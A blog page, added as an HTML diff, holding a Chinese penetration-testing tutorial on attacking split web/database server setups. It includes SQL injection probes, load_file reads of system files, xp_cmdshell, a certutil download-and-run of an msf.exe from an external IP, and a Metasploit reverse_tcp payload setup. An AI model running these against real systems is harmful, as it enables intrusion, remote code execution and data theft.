@@ -1,0 +1,291 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>站库分离渗透思路 | Gridea</title>
+<link rel="shortcut icon" href="https://piaogexu.github.io/favicon.ico?v=1606548080714">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://piaogexu.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="站库分离渗透思路 | Gridea - Atom Feed" href="https://piaogexu.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="站库分离渗透思路
+何为站库分离
+站库分离其实就是管理员将网站程序和数据库分别放在了不同的内网服务器上，这样看似提高了数据安全性，但是如果网站存在漏洞，攻击者还是有可能以Web或Data为入口访问到内网数据库服务器中的数据。
+这种情况大多出现..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://piaogexu.github.io">
+  <img class="avatar" src="https://piaogexu.github.io/images/avatar.png?v=1606548080714" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              站库分离渗透思路
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-11-28
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h3 id="站库分离渗透思路">站库分离渗透思路</h3>
+<h4 id="何为站库分离">何为站库分离</h4>
+<p>站库分离其实就是管理员将网站程序和数据库分别放在了不同的内网服务器上，这样看似提高了数据安全性，但是如果网站存在漏洞，攻击者还是有可能以Web或Data为入口访问到内网数据库服务器中的数据。</p>
+<p>这种情况大多出现在内网环境，不过也有少部分管理员会使用公网数据库，如：自建公网数据库、Amazon/阿里/腾讯/华为RDS云数据库等，并设置允许连接该数据库的白名单IP地址。</p>
+<h4 id="站库分离渗透入口">站库分离渗透入口</h4>
+<ul>
+<li>(1) Web入口渗透</li>
+</ul>
+<p>通过网站的各种漏洞来<code>Getshell</code>，如：文件上传、文件包含、命令执行、代码执行、<code>SQL</code>注入写入一句话（<code>Into outfile</code>、日志备份）等，在获得<code>Webshell</code>权限或者有诸如文件读取等漏洞时，我们可以读数据库配置文件、对数据库内容分析、查找数据库备份，进而对内网数据库服务器进行渗透。</p>
+<ul>
+<li>(2) Data入口渗透</li>
+</ul>
+<p>从数据库入口渗透同样是为了获取更大的权限，或者扩展我们的渗透成果。比如从这台数据库服务器中可以得到网站和数据库的一些用户、密码等信息，在后续的内网渗透中可以很有效的帮助我们。</p>
+<p>通过外网暴露的数据库弱口令、反编译或嗅探<code>C/S</code>客户端以及<code>Web</code>网站<code>SQL</code>注入漏洞等，在获得数据库账户密码或者利用<code>sqlmap</code>进入到<code>os-shell</code>、<code>sql-shell</code>，这时我们不能写入<code>Webshel</code>，因为这台数据库服务器中没有<code>Web</code>环境，但可以通过以下方式来做信息搜集和获取权限，先拿到这台数据库服务器权限，然后再尝试对<code>Web</code>服务器和内网其他主机进行渗透。</p>
+<h4 id="站库分离判断方法">站库分离判断方法</h4>
+<ul>
+<li>(1) 网络连接状态</li>
+</ul>
+<p>通过<code>Netstat</code>命令查看<code>MSSQL</code>数据库<code>1433</code>端口的网络连接状态，可以看到与当前<code>MSSQL</code>数据库服务器<code>192.168.32.8</code>建立连接的只有<code>192.168.32.3</code>，由此可以判断这台主机为<code>Web</code>服务器。</p>
+<pre><code>netstat -ano | findstr &quot;1433&quot;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2020/11/03/Ndh9Jo2stKz7yFv.png" alt="1604367094_1_.jpg" loading="lazy"></figure>
+<ul>
+<li>(2) 数据库配置文件</li>
+</ul>
+<p>通过网站程序数据库配置文件来判断是否站库分离，如果数据库<code>IP</code>地址是<code>localhost</code>、<code>127.0.0.1</code>或当前主机内网IP则说明为同服务器，反之则可能为站库分离，自建公网数据库和<code>RDS</code>云数据库除外。</p>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2020/11/03/XKlp9FSCMIxNEbi.png" alt="1604367207_1_.jpg" loading="lazy"></figure>
+<ul>
+<li>(3) MySQL内置函数和库</li>
+</ul>
+<p>通过<code>MySQL</code>的<code>@@hostname</code>内置函数可以查看服务端主机名称，<code>information_schema</code>内置库的<code>PROCESSLIST</code>可以定位到当前已连接数据库的用户名、主机和端口号等信息，<code>Windows</code>连接格式：<code>主机名:Port</code>，Linux连接格式：<code>IP:Port</code>，本地连接格式：<code>localhost:Port</code>。</p>
+<pre><code>select @@hostname;                                 //服务端主机名称
+select * from information_schema.PROCESSLIST;      //客户端主机名称和端口
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2020/11/03/wDkq92PniNJBTLM.png" alt="1604367343_1_.jpg" loading="lazy"></figure>
+<p>也可以通过<code>load_file()</code>这个内置函数读取一些敏感文件，如：<code>hosts</code>文件中解析的一些内网业务的IP地址和域名，<code>IIS/Apache/Nginx/Tomcat/Jboss/Weblogic/Websphere</code>的相关配置文件以及网卡信息等。</p>
+<pre><code>
+select load_file('C:/Windows/System32/drivers/etc/hosts');
+/etc/hosts
+/etc/apache2/apache2.conf
+/etc/httpd/conf/httpd.conf
+/etc/udev/rules.d/70-persistent-net.rules          //获取网卡名称
+/etc/network/interfaces                            //DHCP或静态IP
+/var/lib/dhclient/dhclient--网卡.lease             //DHCP
+/etc/sysconfig/network-scripts/ifcfg-网卡          //静态IP
+C:/Windows/System32/drivers/etc/hosts
+C:/Windows/system32/inetsrv/MetaBase.xml
+C:/Windows/System32/inetsrv/config/applicationHost.config
+C:/phpStudy/Apache/conf/httpd.conf
+C:/phpStudy/Apache/conf/vhosts.conf
+C:/phpStudy/PHPTutorial/Apache/conf/httpd.conf
+C:/phpStudy/PHPTutorial/Apache/conf/vhosts.conf
+C:/phpStudy/PHPTutorial/nginx/conf/nginx.conf
+C:/phpStudy/PHPTutorial/nginx/conf/vhosts.conf
+[...SNIP...]
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2020/11/03/zfTjQFw2ZtaqIUX.png" alt="1604368325_1_.jpg" loading="lazy"></figure>
+<ul>
+<li>(4) MSSQL内置函数和表</li>
+</ul>
+<p>通过<code>MSSQL</code>的<code>host_name()</code>、<code>@@servername</code>和<code>serverproperty</code>几个内置函数来判断是否站库分离，如果客户端与服务端返回的主机名不一样则说明为站库分离，返回的主机名一样则说明可能为同服务器。</p>
+<pre><code>select host_name();                       //客户端主机名称
+select @@servername;                      //服务端主机名称
+select serverproperty('MachineName');     //服务端主机名称
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2020/11/03/1lJt8YbSBzLIkwU.png" alt="1604368395_1_.jpg" loading="lazy"></figure>
+<p>也可以通过<code>MSSQL</code>的<code>sysprocesses</code>系统表来判断是否站库分离，它的功能类似于<code>MySQL</code>中的<code>PROCESSLIST</code>，可以定位到当前已连接到<code>sqlinject</code>数据库的用户名和主机名等信息。</p>
+<p>有时会有内网多台<code>Web</code>服务器同时连接一台数据库服务器中的不同数据库，这时我们就可以利用这种方式来查看连接到某数据库的用户名和主机名等信息，然后使用<code>Ping</code>主机名得到这台<code>Web</code>服务器的内网<code>IP</code>地址。</p>
+<pre><code>select name from master.sys.sysdatabases;
+select * from master.sys.sysprocesses where dbid= db_id('sqlinject');
+exec master..xp_cmdshell 'cmd /c ping WIN-111111111';
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2020/11/03/oJMq5jT8bFXLx9D.png" alt="1604368481_1_.jpg" loading="lazy"></figure>
+<p>还可以直接通过以下<code>MSSQL</code>注入语句来判断是否站库分离，<code>news</code>必须为数据库中存在的表名，当然用其他存在的表名也是可以的，如果注入页面返回不正常则说明为站库分离，反之则为同服务器。</p>
+<pre><code>and exists(select * from news where 1=(SELECT (case when host_name()=@@servername then 1 else 0 end)))
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2020/11/03/pGIN2dE4uzlRTvK.png" alt="1604368547_1_.jpg" loading="lazy"></figure>
+<h4 id="站库分离利用思路">站库分离利用思路</h4>
+<ul>
+<li>(1) 下载远程文件</li>
+</ul>
+<p>目标主机允许通外网时我们可以利用<code>Vbs/Ftp/IPC$/Certutil/Bitsadmin/Powershell</code>等方式来下载远程文件到可读写目录中，然后再去执行一下即可。</p>
+<pre><code>certutil -urlcache -split -f http://155.**.***.229:8888/msf.exe C:\ProgramData\msf.exe
+C:\ProgramData\msf.exe
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://i.loli.net/2020/11/03/ZUM247sArKN5pYI.png" alt="EVSZ__43_6XG5RQ__`X_E_X.png" loading="lazy"></figure>
+<ul>
+<li>(2) 执行远程Payload</li>
+</ul>
+<p>目标主机允许通外网时我们可以直接利用<code>Metasploit</code>下的<code>exploit/multi/script/web_delivery和exploit/windows/misc/hta_server</code>两个模块来执行远程<code>Payload</code>获取会话，比第一种方法更简单快捷。</p>
+<pre><code>set target 1
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 155.**.***.229
+set lport 443
+exploit
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://i.loli.net/2020/11/03/hIN2RkgrmitWlP3.png" alt="1604368737_1_.jpg" loading="lazy"></figure>
+<ul>
+<li>(3) 模拟令牌权限提升<br>
+曾经在几个这样的“<code>MSSQL</code>站库分离”实战环境中直接通过<code>Incognito</code>扩展中的模拟令牌功能获取到数据库服务器的<code>Admin/SYSTEM</code>令牌。</li>
+</ul>
+<p>在本地“站库分离”靶场环境中测试发现，只要有主机在使用<code>Windows</code>身份验证连接到这台数据库服务器的<code>MSSQL</code>时就会保留当前登录用户的令牌，而大多数人又都是以默认<code>Administrator</code>管理员来安装的<code>MSSQL</code>，所以能够直接获取到<code>Administrator</code>令牌。</p>
+<p>支持Windows身份验证的数据库连接工具有：<code>sqlcmd</code>、<code>SSMS</code>和<code>Navicat Premium</code>等。</p>
+<pre><code>C:\Program Files\Microsoft SQL Server\100\Tools\Binn\sqlcmd.exe -S &quot;192.168.1.109&quot; -E
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://i.loli.net/2020/11/03/hIN2RkgrmitWlP3.png" alt="1604368737_1_.jpg" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF">站库分离渗透思路</a>
+<ul>
+<li><a href="#%E4%BD%95%E4%B8%BA%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB">何为站库分离</a></li>
+<li><a href="#%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB%E6%B8%97%E9%80%8F%E5%85%A5%E5%8F%A3">站库分离渗透入口</a></li>
+<li><a href="#%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95">站库分离判断方法</a></li>
+<li><a href="#%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF">站库分离利用思路</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://piaogexu.github.io/post/zi-liao-spring_boot-xiang-guan/">
+              <h3 class="post-title">
+                资料Spring_Boot相关
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://piaogexu.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
